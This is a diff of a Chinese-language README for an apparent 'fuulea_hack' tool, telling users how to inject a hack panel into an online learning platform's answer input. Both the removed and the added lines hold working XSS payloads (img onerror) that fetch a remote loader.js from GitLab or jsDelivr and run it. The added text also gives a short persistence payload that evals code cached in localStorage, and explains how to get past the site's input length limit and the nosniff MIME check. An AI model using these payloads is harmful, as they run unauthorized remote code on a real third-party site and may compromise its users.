@@ -7,12 +7,22 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88543905/repository/files/loader.js/raw?ref=main').then(r=>r.text()).then(eval)">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.11/loader.js'">
 ```
 
-面板会出现在右下角，再点一次注入收起。
+147 字符，刚好卡在输入框上限内。面板出现在右下角，再点一次注入收起。
 
-> 为什么走 `/api/v4/.../raw` 而不是 `/-/raw/`：GitLab 的 `/-/raw/` 返回 `text/plain` + `nosniff`，`<script>` 标签拒执行；API 版带 `Access-Control-Allow-Origin: *`，所以 `fetch` + `eval` 可用。
+之后每次只要 44 字符：
+
+```html
+<img src=x onerror="eval(localStorage.fhL)">
+```
+
+> 首次注入时 loader 会把自身源码存进 `localStorage.fhL`，并记下版本号 `fhV`；版本一变就自己重新抓一份。
+>
+> **不用手记版本号**：面板 → 工具 → 🧪 环境自检，顶部有「🔄 查最新版并复制」，会自动查 jsDelivr / GitLab 上的最新标签、验证 CDN 可用、把注入串塞进剪贴板，同时刷新本机缓存。默认每次打开自检就自动跑一次，可在那一行关掉。
+>
+> 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 
 ## 功能
 
